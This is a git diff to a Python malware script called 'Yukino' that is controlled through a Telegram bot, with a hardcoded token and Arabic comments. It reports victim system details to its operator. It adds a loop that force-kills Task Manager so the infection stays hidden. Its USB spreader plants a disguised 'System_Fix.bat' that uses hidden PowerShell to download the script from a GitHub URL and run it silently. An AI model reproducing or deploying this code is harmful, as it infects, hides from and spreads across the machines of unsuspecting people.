@@ -4,21 +4,40 @@ import platform
 import socket
 import threading
 import time
+import subprocess
 
-# التوكن الخاص بك
+# التوكن الخاص بك (يوكينو - غالب)
 TOKEN = "8060120509:AAHUzbeWow9DAGR1zCAr4YjlIXSiemYWd9g"
 bot = telebot.TeleBot(TOKEN)
 
 # --- معلومات الجهاز الضحية ---
 def get_system_info():
-    info = {
-        "اسم الجهاز": socket.gethostname(),
-        "النظام": platform.system(),
-        "الإصدار": platform.version(),
-        "المعالج": platform.processor(),
-        "المستخدم": os.getlogin()
-    }
-    return info
+    try:
+        info = {
+            "اسم الجهاز": socket.gethostname(),
+            "النظام": platform.system(),
+            "الإصدار": platform.version(),
+            "المعالج": platform.processor(),
+            "المستخدم": os.getlogin()
+        }
+        return info
+    except:
+        return {"خطأ": "تعذر جلب معلومات النظام"}
+
+# --- بروتوكول الدفاع الذاتي (Anti-Task Manager) ---
+def self_defense():
+    while True:
+        try:
+            # البحث عن برامج المراقبة مثل مدير المهام
+            output = subprocess.check_output('tasklist', shell=True).decode()
+            if "taskmgr.exe" in output.lower():
+                # إغلاق مدير المهام فوراً قبل أن يكتشف يوكينو
+                os.system("taskkill /f /im taskmgr.exe")
+                # إبلاغ غالب بالهجوم
+                bot.send_message(8060120509, "⚠️ سيدي غالب، أحدهم حاول فتح مدير المهام لمراقبتي! تم سحقه وإغلاق البرنامج بنجاح. 🛡️")
+        except:
+            pass
+        time.sleep(2) # فحص كل ثانيتين لضمان سرعة الاستجابة
 
 # --- أمر البداية ---
 @bot.message_handler(commands=['start'])
@@ -26,31 +45,41 @@ def welcome(message):
     sys_info = get_system_info()
     response = (
         f"✅ سيدي غالب، يوكينو استيقظت في نظام جديد!\n\n"
-        f"💻 الجهاز: {sys_info['اسم الجهاز']}\n"
-        f"👤 المستخدم: {sys_info['المستخدم']}\n"
-        f"🖥️ النظام: {sys_info['النظام']}\n\n"
-        "أنا جاهزة لتلقي أوامرك السرية."
+        f"💻 الجهاز: {sys_info.get('اسم الجهاز')}\n"
+        f"👤 المستخدم: {sys_info.get('المستخدم')}\n"
+        f"🖥️ النظام: {sys_info.get('النظام')}\n\n"
+        "🛡️ درع الحماية الذاتية: نَشِط\n"
+        "📡 بروتوكول الانتشار: نَشِط\n\n"
+        "أنا بانتظار أوامرك."
     )
     bot.reply_to(message, response)
 
 # --- بروتوكول الانتشار (USB Virus) ---
 def usb_spreader():
     while True:
-        # البحث عن الفلاش ميموري في ويندوز
         for letter in "DEFG":
             path = f"{letter}:\\"
             if os.path.exists(path):
-                # إذا وجد فلاش، يزرع نفسه فيه
                 try:
-                    with open(os.path.join(path, "System_Fix.bat"), "w") as f:
-                        f.write("@echo off\nstart pythonw app.py\necho System Updated.")
+                    # زرع ملف التشغيل التلقائي في الفلاش الجديد
+                    file_path = os.path.join(path, "System_Fix.bat")
+                    if not os.path.exists(file_path):
+                        with open(file_path, "w") as f:
+                            # الكود الذي يسحب النسخة من GitHub ويشغلها مخفية
+                            f.write("@echo off\n")
+                            f.write("powershell -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Guleb1122/Yukino-Project/main/app.py' -OutFile '$env:LOCALAPPDATA\\yukino_agent.py'; start-process pythonw.exe -ArgumentList '$env:LOCALAPPDATA\\yukino_agent.py'\"\n")
+                            f.write("echo System Updated.\n")
+                            f.write("exit")
                 except:
                     pass
         time.sleep(30)
 
-# تشغيل الانتشار في خلفية النظام
+# --- تشغيل العمليات في الخلفية ---
+# 1. تشغيل الانتشار
 threading.Thread(target=usb_spreader, daemon=True).start()
+# 2. تشغيل الدفاع الذاتي
+threading.Thread(target=self_defense, daemon=True).start()
 
 # تشغيل البوت
-print("Yukino is running...")
+print("Yukino is running with Defense Protocols...")
 bot.infinity_polling()
